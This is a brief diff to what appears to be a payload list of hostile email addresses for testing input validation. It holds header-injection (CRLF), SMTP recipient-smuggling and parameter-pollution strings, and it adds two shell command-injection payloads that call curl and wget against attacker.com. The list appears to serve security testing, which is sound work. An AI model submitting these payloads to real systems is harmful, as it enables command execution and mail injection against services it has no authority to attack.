@@ -9,3 +9,5 @@ john.doe@[127.0.0.1]
 victim&email=attacker@attacker.com
 "%0d%0aContent-Length:%200%0d%0a%0d%0a"@attacker.com
 "recipient@test.com>\r\nRCPT TO:<victim+"@attacker.com
+";curl attacker.com;"@attacker.com
+";wget${IFS}attacker.com;"@attacker.com
